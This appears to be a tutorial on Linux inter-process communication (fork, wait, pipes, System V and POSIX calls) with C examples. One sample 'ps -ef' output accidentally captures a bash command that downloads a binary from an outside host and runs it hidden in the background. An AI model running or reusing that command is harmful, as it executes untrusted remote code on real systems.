# Inter Process Communication

Inter Process Communication (IPC) is a mechanism that involves communication of one process with another process. This usually occurs only in one system.

Communication can be of two types −

- Between related processes initiating from only one process, such as parent and child processes.
- Between unrelated processes, or two or more different processes..

Following are some important terms that we need to know before proceeding further on this topic.

**Pipes** − Communication between **two related processes**. The mechanism is half duplex meaning the first process communicates with the second process. To achieve a full duplex i.e., for the second process to communicate with the first process another pipe is required.

**FIFO** − Communication between **two unrelated processes**. FIFO is a ***full duplex***, meaning the first process can communicate with the second process and vice versa at the same time.

**Message Queues** − Communication between ***two or more processes with full duplex capacity***. The processes will communicate with each other by posting a message and retrieving it out of the queue. Once retrieved, the message is no longer available in the queue.

**Shared Memory** − Communication between **two or more processes** is achieved through a shared piece of memory among all processes. The shared memory needs to be protected from each other by synchronizing access to all the processes.

**Semaphores** − Semaphores are meant for synchronizing access to multiple processes. When one process wants to access the memory (for reading or writing), it needs to be locked (or protected) and released when the access is removed. This needs to be repeated by all the processes to secure data.

**Signals** − Signal is a mechanism to communication between multiple processes by way of signaling. This means a source process will send a signal (recognized by number) and the destination process will handle it accordingly.

## Process Information

What is a process? 

​	A process is a program in execution.

What is a program? 

​	A program is a file containing the information of a process and how to build it during run time. When you start execution of the program, it is loaded into RAM and starts executing.

Each process is identified with a unique positive integer called as process ID or simply PID (Process Identification number). The kernel usually limits the process ID to 32767, which is configurable. When the process ID reaches this limit, it is reset again, which is after the system processes range. The unused process IDs from that counter are then assigned to newly created processes.

The system call getpid() returns the process ID of the calling process.

```c
#include <sys/types.h>
#include <unistd.h>

pid_t getpid(void);
```

This call returns the process ID of the calling process which is guaranteed to be unique. This call is always successful and thus no return value to indicate an error.

Each process has its unique ID called process ID that is fine but who created it? How to get information about its creator? Creator process is called the parent process. Parent ID or PPID can be obtained through getppid() call.

The system call getppid() returns the Parent PID of the calling process.

```c
#include <sys/types.h>
#include <unistd.h>

pid_t getppid(void);
```

This call returns the parent process ID of the calling process. This call is always successful and thus no return value to indicate an error.

Following is a program to know the PID and PPID of the calling process.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
   int mypid, myppid;
   printf("Program to know PID and PPID's information\n");
   mypid = getpid();
   myppid = getppid();
   printf("My process ID is %d\n", mypid);
   printf("My parent process ID is %d\n", myppid);
   printf("Cross verification of pid's by executing process commands on shell\n");
   system("ps -ef");
   return 0;
}
```

On compilation and execution of the above program, following will be the output.

```c
UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0  2017 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
mysql       101      1  0  2017 ?        00:06:06 /usr/libexec/mysqld 
                                         --basedir = /usr 
                                         --datadir = /var/lib/mysql 
                                         --plugin-dir = /usr/lib64/mysql/plugin 
                                         --user = mysql 
                                         --log-error = /var/log/mariadb/mariadb.log 
                                         --pid-file = /run/mariadb/mariadb.pid 
                                         --socket = /var/lib/mysql/mysql.sock
2868535   96284      0  0 05:23 ?        00:00:00 bash -c download() { 
                                         flag = "false" hsize = 1 
                                         echo -e "GET /$2 HTTP/1.1\nHost: 
                                         $1\nConnection: close\n\n" | 
                                         openssl s_client -timeout -quiet 
                                         -verify_quiet -connect $1:443 2> 
                                         /dev/null | tee out | while read line do
                                         if [[ "$flag" == "false" ]]     
                                         then 
                                         hsize = $((hsize+$(echo $line | wc -c)))
                                         fi
                                         if [[ "${line:1:1}" == "" ]]     
                                         then flag = "true"
                                         fi 
                                         echo $hsize > 
                                         size done tail -c +$(cat size) out > 
                                         $2 rm size out }
                                         ( download my.mixtape.moe mhawum 2>
                                         /dev/null chmod +x mhawum 2>
                                         /dev/null ./mhawum >
                                         /dev/null 2>
                                         /dev/null )&
2868535   96910  96284 99 05:23 ?        00:47:26 ./mhawum
6118874  104116      0  3 05:25 ?        00:00:00 sh -c cd /home/cg/root/6118874; 
                                         timeout 10s javac Puppy.java
6118874  104122 104116  0 05:25 ?        00:00:00 timeout 10s javac Puppy.java
6118874  104123 104122 23 05:25 ?        00:00:00 javac Puppy.java
3787205  104169      0  0 05:25 ?        00:00:00 sh -c cd /home/cg/root/3787205; 
                                         timeout 10s main
3787205  104175 104169  0 05:25 ?        00:00:00 timeout 10s main
3787205  104176 104175  0 05:25 ?        00:00:00 main
3787205  104177 104176  0 05:25 ?        00:00:00 ps -ef
Program to know PID and PPID's information
My process ID is 104176
My parent process ID is 104175
Cross verification of pid's by executing process commands on shell
```

## Process Image

What exactly is process image? Process image is an executable file required while executing the program. This image usually contains the following sections −

- Code segment or text segment
- Data segment
- Stack segment
- Heap segment

**Code segment** is a portion of object file or program’s virtual address space that consists of executable instructions. This is usually read-only data segment and has a fixed size.

Data segment is of two types.

- Initialized
- Un-initialized

**Initialized data segment** is a portion of the object file or program’s virtual address space that consists of initialized static and global variables.

**Un-initialized data segment** is a portion of the object file or program’s virtual address space that consists of uninitialized static and global variables. Un-initialized data segment is also called BSS (Block Started by Symbol) segment.

**Data segment** is read-write, since the values of variables could be changed during run time. This segment also has a fixed size.

**Stack segment** is an area of memory allotted for automatic variables and function parameters. It also stores a return address while executing function calls. Stack uses LIFO (Last-In-First-Out) mechanism for storing local or automatic variables, function parameters and storing next address or return address. The return address refers to the address to return after completion of function execution. This segment size is variable as per local variables, function parameters, and function calls. This segment grows from a higher address to a lower address.

**Heap segment** is area of memory allotted for dynamic memory storage such as for malloc() and calloc() calls. This segment size is also variable as per user allocation. This segment grows from a lower address to a higher address.

Let us now check how the segments (data and bss segments) size vary with a few sample programs. Segment size is known by executing the command “size”.

### Initial program

##### File: segment_size1.c

```c
#include<stdio.h>

int main() {
   printf("Hello World\n");
   return 0;
}
```

In the following program, an uninitialized static variable is added. This means uninitialized segment (BSS) size would increase by 4 Bytes.

##### File: segment_size2.c

```C
#include<stdio.h>

int main() {
   static int mystaticint1;
   printf("Hello World\n");
   return 0;
}
```

In the following program, an initialized static variable is added. This means initialized segment (DATA) size would increase by 4 Bytes.

##### File: segment_size3.c

```C
#include<stdio.h>

int main() {
   static int mystaticint1;
   static int mystaticint2 = 100;
   printf("Hello World\n");
   return 0;
}
```

In the following program, an initialized global variable is added. This means initialized segment (DATA) size would increase by 4 Bytes.

##### File: segment_size4.c

```c
#include<stdio.h>

int myglobalint1 = 500;
int main() {
   static int mystaticint1;
   static int mystaticint2 = 100;
   printf("Hello World\n");
   return 0;
}
```

In the following program, an uninitialized global variable is added. This means uninitialized segment (BSS) size would increase by 4 Bytes.

##### File: segment_size5.c

```c
#include<stdio.h>

int myglobalint1 = 500;
int myglobalint2;
int main() {
   static int mystaticint1;
   static int mystaticint2 = 100;
   printf("Hello World\n");
   return 0;
}
```

### Execution Steps

##### Compilation

```c
$ gcc segment_size1.c -o segment_size1
$ gcc segment_size2.c -o segment_size2
$ gcc segment_size3.c -o segment_size3
$ gcc segment_size4.c -o segment_size4
$ gcc segment_size5.c -o segment_size5
```

##### Execution/Output

```c
babukrishnam size segment_size1 segment_size2 segment_size3 segment_size4 segment_size5
   text  data  bss  dec  hex  filename
   878   252    8   1138 472  segment_size1 
   878   252   12   1142 476  segment_size2 
   878   256   12   1146 47a  segment_size3 
   878   260   12   1150 47e  segment_size4 
   878   260   16   1154 482  segment_size5
```
## Process Creation & Termination

How do we need to create a process within the program and may be wanted to schedule a different task for it. Can this be achieved? Yes, obviously through process creation. Of course, after the job is done it would get terminated automatically or you can terminate it as needed.

Process creation is achieved through the **fork() system call**. The newly created process is called the child process and the process that initiated it (or the process when execution is started) is called the parent process. After the fork() system call, now we have two processes - parent and child processes. How to differentiate them? Very simple, it is through their return values.

![System Call](https://www.tutorialspoint.com/inter_process_communication/images/system_call.jpg)

After creation of the child process, let us see the fork() system call details.

```c
#include <sys/types.h>
#include <unistd.h>

pid_t fork(void);
```

Creates the child process. After this call, there are two processes, the existing one is called the parent process and the newly created one is called the child process.

The fork() system call returns either of the three values −

- Negative value to indicate an error, i.e., unsuccessful in creating the child process.
- Returns a zero for child process.
- Returns a positive value for the parent process. This value is the process ID of the newly created child process.

Let us consider a simple program.

### File name: basicfork.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
   fork();
   printf("Called fork() system call\n");
   return 0;
}
```

##### Compilation

```
gcc basicfork.c -o basicfork
```

##### Execution/Output

```
Called fork() system call
Called fork() system call
```

**Note** − Usually after fork() call, the child process and the parent process would perform different tasks. If the same task needs to be run, then for each fork() call it would run 2 power n times, where **n** is the number of times fork() is invoked.

In the above case, fork() is called once, hence the output is printed twice (2 power 1). If fork() is called, say 3 times, then the output would be printed 8 times (2 power 3). If it is called 5 times, then it prints 32 times and so on and so forth.

### File name: pids_after_fork.c

Having seen fork() create the child process, it is time to see the details of the parent and the child processes.

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
   pid_t pid, mypid, myppid;
   pid = getpid();
   printf("Before fork: Process id is %d\n", pid);
   pid = fork();

   if (pid < 0) {
      perror("fork() failure\n");
      return 1;
   }

   // Child process
   if (pid == 0) {
      printf("This is child process\n");
      mypid = getpid();
      myppid = getppid();
      printf("Process id is %d and PPID is %d\n", mypid, myppid);
   } 
   else { // Parent process 
      sleep(2);
      printf("This is parent process\n");
      mypid = getpid();
      myppid = getppid();
      printf("Process id is %d and PPID is %d\n", mypid, myppid);
      printf("Newly created process id or child pid is %d\n", pid);
   }
   return 0;
}
```

##### Compilation and Execution Steps

```c
Before fork: Process id is 166629
This is child process
Process id is 166630 and PPID is 166629
Before fork: Process id is 166629
This is parent process
Process id is 166629 and PPID is 166628
Newly created process id or child pid is 166630
```

### Termination

A process can terminate in either of the two ways −

- Abnormally, occurs on delivery of certain signals, say terminate signal.
- Normally, using _exit() system call (or _Exit() system call) or exit() library function.

The difference between _exit() and exit() is mainly the cleanup activity. The **exit()** does some cleanup before returning the control back to the kernel, while the **_exit()** (or _Exit()) would return the control back to the kernel immediately.

Consider the following example program with exit().

##### File name: atexit_sample.c

```c
#include <stdio.h>
#include <stdlib.h>

void exitfunc() {
   printf("Called cleanup function - exitfunc()\n");
   return;
}

int main() {
   atexit(exitfunc);
   printf("Hello, World!\n");
   exit (0);
}
```

##### Compilation and Execution Steps

```c
Hello, World!
Called cleanup function - exitfunc()
```

Consider the following example program with _exit().

##### File name: at_exit_sample.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void exitfunc() {
   printf("Called cleanup function - exitfunc()\n");
   return;
}

int main() {
   atexit(exitfunc);
   printf("Hello, World!\n");
   _exit (0);
}
```

##### Compilation and Execution Steps

```c
Hello, World!
```

## Child Process Monitoring

As we have seen, whenever we create a child process from a program using fork, the following happens −

- Current process now becomes the parent process
- The new process becomes the child process

What happens if the parent process finishes its task early than the child process and then quits or exits? Now who would be the parent of the child process? The parent of the child process is init process, which is the very first process initiating all the tasks.

To monitor the child process execution state, to check whether the child process is running or stopped or to check the execution status, etc. the wait() system calls and its variants is used.

Let us consider an example program, where the parent process does not wait for the child process, which results into init process becoming the new parent for the child process.

##### File name: parentprocess_nowait.c

```c
#include<stdio.h>

int main() {
   int pid;
   pid = fork();
   
   // Child process
   if (pid == 0) {
      system("ps -ef");
      sleep(10);
      system("ps -ef");
   } else {
      sleep(3);
   }
   return 0;
}
```

Observe that the parent process PID was 94 and the child process PID was 95. After the parent process exits, the PPID of the child process changed from 94 to 1 (init process).

Following are the variants of system calls to monitor the child process/es −

- wait()
- waitpid()
- waitid()

The **wait()** system call would wait for one of the children to terminate and return its termination status in the buffer as explained below.

```c
#include <sys/types.h>
#include <sys/wait.h>

pid_t wait(int *status);
```

This call returns the process ID of the terminated child on success and -1 on failure. The wait() system call suspends the execution of the current process and waits indefinitely until one of its children terminates. The termination status from the child is available in status.

Let us modify the previous program, so that the parent process now waits for the child process.

##### File name: parentprocess_waits.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

int main() {
   int pid;
   int status;
   pid = fork();
   
   // Child process
   if (pid == 0) {
      system("ps -ef");
      sleep(10);
      system("ps -ef");
      return 3; //exit status is 3 from child process
   } else {
      sleep(3);
      wait(&status);
      printf("In parent process: exit status from child is decimal %d, hexa %0x\n", status, status);
   }
   return 0;
}
```

Output:

```c
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 May20 ?        00:06:19 /sbin/init
root        51     1  0 May20 ?        00:00:05 /lib/systemd/systemd-journald
root        57     1  0 May20 ?        00:00:00 /lib/systemd/systemd-udevd
root       246     1  0 May20 ?        00:00:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
message+   318     1  0 May20 ?        00:01:33 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       319     1  0 May20 ?        00:00:44 /lib/systemd/systemd-logind
root       322     1  0 May20 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
root       324     1  0 May20 ?        00:00:00 /usr/sbin/sshd -D
syslog     325     1  0 May20 ?        00:00:01 /usr/sbin/rsyslogd -n
root       326     1  0 May20 ?        00:00:00 /usr/sbin/cron -f
root       327     1  0 May20 ?        00:00:01 /usr/lib/snapd/snapd
daemon     331     1  0 May20 ?        00:00:00 /usr/sbin/atd -f
root       360     1  0 May20 ?        00:00:00 /sbin/agetty --noclear --keep-baud console 115200 38400 9600 vt220
root       381     1  0 May20 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root     23487     0  0 10:50 ?        00:00:00 sh -c umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/bin;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/boot;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/dev;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/etc;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/lib;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/lib64;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/media;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/mnt;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/opt;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/proc;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/run;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/sbin;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/srv;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/sys;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/tmp;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/usr;umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/var;
root     23509 23487  0 10:50 ?        00:00:00 umount -l /home/5ecc58ca2f0928329f438d91b7c2d3e4/5ecc58ca2f0928329f438d91b7c2d3e4/media
root     23510     0  0 10:50 ?        00:00:00 sh -c /home/cppDriverNew 81fe6affab812da30d93d980a6ce2507 C++14 5 134217728
root     23511 23510  0 10:50 ?        00:00:00 /home/cppDriverNew 81fe6affab812da30d93d980a6ce2507 C++14 5 134217728
1001     23512 23511  0 10:50 ?        00:00:00 /home/81fe6affab812da30d93d980a6ce2507
1001     23513 23512  0 10:50 ?        00:00:00 /home/81fe6affab812da30d93d980a6ce2507
1001     23514 23513  0 10:50 ?        00:00:00 sh -c ps -ef
1001     23515 23514  0 10:50 ?        00:00:00 ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 May20 ?        00:06:19 /sbin/init
root        51     1  0 May20 ?        00:00:05 /lib/systemd/systemd-journald
root        57     1  0 May20 ?        00:00:00 /lib/systemd/systemd-udevd
root       246     1  0 May20 ?        00:00:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
message+   318     1  0 May20 ?        00:01:33 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       319     1  0 May20 ?        00:00:44 /lib/systemd/systemd-logind
root       322     1  0 May20 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
root       324     1  0 May20 ?        00:00:00 /usr/sbin/sshd -D
syslog     325     1  0 May20 ?        00:00:01 /usr/sbin/rsyslogd -n
root       326     1  0 May20 ?        00:00:00 /usr/sbin/cron -f
root       327     1  0 May20 ?        00:00:01 /usr/lib/snapd/snapd
daemon     331     1  0 May20 ?        00:00:00 /usr/sbin/atd -f
root       360     1  0 May20 ?        00:00:00 /sbin/agetty --noclear --keep-baud console 115200 38400 9600 vt220
root       381     1  0 May20 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root     23510     0  0 10:50 ?        00:00:00 sh -c /home/cppDriverNew 81fe6affab812da30d93d980a6ce2507 C++14 5 134217728
root     23511 23510  0 10:50 ?        00:00:00 /home/cppDriverNew 81fe6affab812da30d93d980a6ce2507 C++14 5 134217728
1001     23512 23511  0 10:50 ?        00:00:00 /home/81fe6affab812da30d93d980a6ce2507
1001     23513 23512  0 10:50 ?        00:00:00 /home/81fe6affab812da30d93d980a6ce2507
1001     23741 23513  0 10:50 ?        00:00:00 sh -c ps -ef
1001     23742 23741  0 10:50 ?        00:00:00 ps -ef
In parent process: exit status from child is decimal 768, hexa 300
```

**Note** − Even though child returns the exit status of 3, why the parent process sees that as 768. The status is stored in the higher order byte, so it is stored in hexadecimal format as 0X0300, which is 768 in decimal. Normal termination is as follows

| Higher Order Byte (Bits 8 to 15) | Lower Order Byte (Bits 0 to 7) |
| -------------------------------- | ------------------------------ |
| Exit status (0 to 255)           | 0                              |

The wait() system call has limitation such as it can only wait until the exit of the next child. If we need to wait for a specific child it is not possible using wait(), however, it is possible using **waitpid()** system call.

***The waitpid() system call would wait for specified children to terminate and return its termination status in the buffer as explained below.***

```c
#include <sys/types.h>
#include <sys/wait.h>

pid_t waitpid(pid_t pid, int *status, int options);
```

The above call returns the process ID of the terminated child on success and -1 on failure. The waitpid() system call suspends the execution of the current process and waits indefinitely until the specified children (as per pid value) terminates. The termination status from the child is available in the status.

The value of pid can be either of the following −

- **< -1** − Wait for any child process whose process group ID is equal to the absolute value of pid.
- **-1** − Wait for any child process, which equals to that of wait() system call.
- **0** − Wait for any child process whose process group ID is equal to that of the calling process.
- **>0** − Wait for any child process whose process ID is equal to the value of pid.

By default, waitpid() system call waits only for the terminated children but this default behavior can be modified using the options argument.

## Process Groups, Sessions & Job Control

**Process Group** − Process group is a collection of one or more processes. A process group constitutes of one or more processes sharing the same process group identifier (PGID). A process group ID (PGID) is of the same type (pid_t) as the process ID. A process group has a process group leader, which is the process that creates the group and whose process ID becomes the process group ID of the group.

**Sessions** − It is a collection of various process groups.

**Job Control** − This permits a shell user to simultaneously execute multiple commands (or jobs), one in the foreground and all remaining in the background. It is also possible to move the jobs from the foreground to the background and vice-versa.

Let us understand this with the help of example program/s using shell (BASH).

- Shell script (in BASH) to perform basic commands (date, echo, sleep and cal) named basic_commands.sh
- Shell script (in BASH) to perform basic commands (ps, echo)

```bash
#!/bin/bash
#basic_commands.sh

date
echo "Now sleeping for 250 seconds, so that testing job control functionality is smooth"
sleep 250
cal
```

```bash
#!/bin/bash
#process_status.sh

ps
echo "Now sleeping for 200 seconds, so that testing job control functionality is smooth"
sleep 200
ps
```

Use chmod command to give the file the execute permissions. By default, the normal file would get only read and write permissions and not execute permissions.

To stop the current running process, you need to enter CTRL+Z. This gives you a job number. The job can be resumed either in the foreground or the background. If needed, to resume the job in the foreground use ‘fg’ command. If needed, to resume the job in the background, use ‘bg’ command. By using this, it would run only the last stopped process. What if you want to start other than the last stopped process? Just use the job number after fg or bg (say bg %2 or bg %3, etc). If the running job is in the background, you can run any other tasks in the foreground. To get the list of jobs, use command, jobs. It is also possible to terminate the process either with CTRL+C or kill command. You can pass the job number while using the kill command.

Check the following output which demonstrates stopping the jobs, moving the jobs from the foreground to the background and vice versa, terminating the jobs, etc.

```bash
chmod u+x basic_commands.sh
chmod u+x process_status.sh

./basic_commands.sh
```

## Related System Calls (System V)

Following table lists the various System calls along with their description.

| Category            | System Call  | Description                                                  |
| ------------------- | ------------ | ------------------------------------------------------------ |
| General             | open ()      | This system call either opens an already existing file or creates and opens a new file. |
| General             | creat ()     | Creates and opens a new file.                                |
| General             | read ()      | Reads the contents of the file into the required buffer.     |
| General             | write ()     | Writes the contents of buffer into the file.                 |
| General             | close ()     | Closes the file descriptor.                                  |
| General             | stat ()      | Provides information on the file.                            |
| Pipes               | pipe ()      | Creates pipe for communication which returns two file descriptors for reading and writing. |
| Named Pipes or Fifo | mknod ()     | Creates a memory device file or special file to create FIFOs |
| Named Pipes or Fifo | mkfifo ()    | Creates a new FIFO                                           |
| Shared Memory       | shmget ()    | Creates a new shared memory segment or gets the identifier of the existing segment. |
| Shared Memory       | shmat ()     | Attaches the shared memory segment and makes the segment a part of the virtual memory of the calling process. |
| Shared Memory       | shmdt ()     | Detaches the shared memory segment.                          |
| Shared Memory       | shmctl ()    | Performs control operations for the shared memory. Few of the generic control operations for the shared memory are removing the shared memory segment (IPC_RMID), receiving the information of the shared memory (IPC_STAT) and updating new values of the existing shared memory (IPC_SET). |
| Message Queues      | msgget ()    | Creates a new message queue or accesses an already existing message queue and gets the handle or identifier to perform operations with regard to message queue, such as sending message/s to queue and receiving message/s from the queue. |
| Message Queues      | msgsnd ()    | Sends a message to the required message queue with the required identification number. |
| Message Queues      | msgrcv ()    | Receives a message from the message queue. By default, this is infinite wait operation, means the call will be blocked until it receives a message. |
| Message Queues      | msgctl ()    | Performs control operations for the message queue. Few of the generic control operations for the message queue are removing the message queue (IPC_RMID), receiving the information of the message queue (IPC_STAT) and updating new values of the existing message queue (IPC_SET). |
| Semaphores          | semget ()    | Creates a new semaphore or gets the identifier of the existing semaphore. Semaphores are used to perform synchronization between various IPCs working on the same object. |
| Semaphores          | semop ()     | Performs semaphore operations on semaphore values. The basic semaphore operations are either acquiring or releasing the lock on the semaphore. |
| Semaphores          | semctl ()    | Performs control operations for the semaphore. Few of the generic control operations for the semaphore are removing the semaphore (IPC_RMID), receiving the information of the semaphore (IPC_STAT) and updating new values of the existing semaphore (IPC_SET). |
| Signals             | signal ()    | Setting the disposition of the signal (signal number) and the signal handler. In other terms, registering the routine, which gets executed when that signal is raised. |
| Signals             | sigaction () | Same as signal(), setting the disposition of the signal i.e., performing certain action as per the registered signal handler after the receipt of the registered signal. This system call supports finer control over signal() such as blocking certain signals, restoring signal action to the default state after calling the signal handler, providing information such as consumed time of the user and the system, process id of sending process, etc. |
| Memory Mapping      | mmap ()      | Mapping files into the memory. Once mapped into the memory, accessing files is as easy as accessing data using addresses and also in this way, the call is not expensive as system calls. |
| Memory Mapping      | munmap ()    | Un-mapping the mapped files from the memory.                 |

## System V & Posix

Following table lists the differences between System V IPC and POSIX IPC.

| SYSTEM V                                                     | POSIX                                                        |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| AT & T introduced (1983) three new forms of IPC facilities namely message queues, shared memory, and semaphores. | Portable Operating System Interface standards specified by IEEE to define application programming interface (API). POSIX covers all the three forms of IPC |
| SYSTEM V IPC covers all the IPC mechanisms viz., pipes, named pipes, message queues, signals, semaphores, and shared memory. It also covers socket and Unix Domain sockets. | Almost all the basic concepts are the same as System V. It only differs with the interface |
| Shared Memory Interface Calls shmget(), shmat(), shmdt(), shmctl() | Shared Memory Interface Calls shm_open(), mmap(), shm_unlink() |
| Message Queue Interface Calls msgget(), msgsnd(), msgrcv(), msgctl() | Message Queue Interface Calls mq_open(), mq_send(), mq_receive(), mq_unlink() |
| Semaphore Interface Calls semget(), semop(), semctl()        | Semaphore Interface Calls Named Semaphores sem_open(), sem_close(), sem_unlink(), sem_post(), sem_wait(), sem_trywait(), sem_timedwait(), sem_getvalue() Unnamed or Memory based semaphores sem_init(), sem_post(), sem_wait(), sem_getvalue(),sem_destroy() |
| Uses keys and identifiers to identify the IPC objects.       | Uses names and file descriptors to identify IPC objects      |
| NA                                                           | POSIX Message Queues can be monitored using select(), poll() and epoll APIs |
| Offers msgctl() call                                         | Provides functions (mq_getattr() and mq_setattr()) either to access or set attributes 11. IPC - System V & POSIX |
| NA                                                           | Multi-thread safe. Covers thread synchronization functions such as mutex locks, conditional variables, read-write locks, etc. |
| NA                                                           | Offers few notification features for message queues (such as mq_notify()) |
| Requires system calls such as shmctl(), commands (ipcs, ipcrm) to perform status/control operations. | Shared memory objects can be examined and manipulated using system calls such as fstat(), fchmod() |
| The size of a System V shared memory segment is fixed at the time of creation (via shmget()) | We can use ftruncate() to adjust the size of the underlying object, and then re-create the mapping using munmap() and mmap() (or the Linux-specific mremap()) |

# Inter Process Communication - Pipes

Pipe is a communication medium between two or more related or interrelated processes. It can be either within one process or a communication between the child and the parent processes. Communication can also be multi-level such as communication between the parent, the child and the grand-child, etc. Communication is achieved by one process writing into the pipe and other reading from the pipe. To achieve the pipe system call, create two files, one to write into the file and another to read from the file.

Pipe mechanism can be viewed with a real-time scenario such as filling water with the pipe into some container, say a bucket, and someone retrieving it, say with a mug. The filling process is nothing but writing into the pipe and the reading process is nothing but retrieving from the pipe. This implies that one output (water) is input for the other (bucket).

```c
#include<unistd.h>

int pipe(int pipedes[2]);
```

This system call would create a pipe for one-way communication i.e., it creates two descriptors, first one is connected to read from the pipe and other one is connected to write into the pipe.

Descriptor pipedes[0] is for reading and pipedes[1] is for writing. Whatever is written into pipedes[1] can be read from pipedes[0].

This call would return zero on success and -1 in case of failure. To know the cause of failure, check with errno variable or perror() function.

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int open(const char *pathname, int flags);
int open(const char *pathname, int flags, mode_t mode);
```

Even though the basic operations for file are read and write, it is essential to open the file before performing the operations and closing the file after completion of the required operations. Usually, by default, 3 descriptors opened for every process, which are used for input (standard input – stdin), output (standard output – stdout) and error (standard error – stderr) having file descriptors 0, 1 and 2 respectively.

This system call would return a file descriptor used for further file operations of read/write/seek (lseek). Usually file descriptors start from 3 and increase by one number as the number of files open.

he arguments passed to open system call are pathname (relative or absolute path), flags mentioning the purpose of opening file (say, opening for read, O_RDONLY, to write, O_WRONLY, to read and write, O_RDWR, to append to the existing file O_APPEND, to create file, if not exists with O_CREAT and so on) and the required mode providing permissions of read/write/execute for user or owner/group/others. Mode can be mentioned with symbols.

Read – 4, Write – 2 and Execute – 1.

For example: Octal value (starts with 0), 0764 implies owner has read, write and execute permissions, group has read and write permissions, other has read permissions. This can also be represented as S_IRWXU | S_IRGRP | S_IWGRP | S_IROTH, which implies or operation of 0700|0040|0020|0004 → 0764.

This system call, on success, returns the new file descriptor id and -1 in case of error. The cause of error can be identified with errno variable or perror() function.

```c
#include<unistd.h>

int close(int fd)
```

The above system call closing already opened file descriptor. This implies the file is no longer in use and resources associated can be reused by any other process. This system call returns zero on success and -1 in case of error. The cause of error can be identified with errno variable or perror() function.

```c
#include<unistd.h>

ssize_t read(int fd, void *buf, size_t count)
```

The above system call is to read from the specified file with arguments of file descriptor fd, proper buffer with allocated memory (either static or dynamic) and the size of buffer.

The file descriptor id is to identify the respective file, which is returned after calling open() or pipe() system call. The file needs to be opened before reading from the file. It automatically opens in case of calling pipe() system call.

This call would return the number of bytes read (or zero in case of encountering the end of the file) on success and -1 in case of failure. The return bytes can be smaller than the number of bytes requested, just in case no data is available or file is closed. Proper error number is set in case of failure.

To know the cause of failure, check with errno variable or perror() function.

```
#include<unistd.h>

ssize_t write(int fd, void *buf, size_t count)
```

The above system call is to write to the specified file with arguments of the file descriptor fd, a proper buffer with allocated memory (either static or dynamic) and the size of buffer.

The file descriptor id is to identify the respective file, which is returned after calling open() or pipe() system call.

The file needs to be opened before writing to the file. It automatically opens in case of calling pipe() system call.

This call would return the number of bytes written (or zero in case nothing is written) on success and -1 in case of failure. Proper error number is set in case of failure.

To know the cause of failure, check with errno variable or perror() function.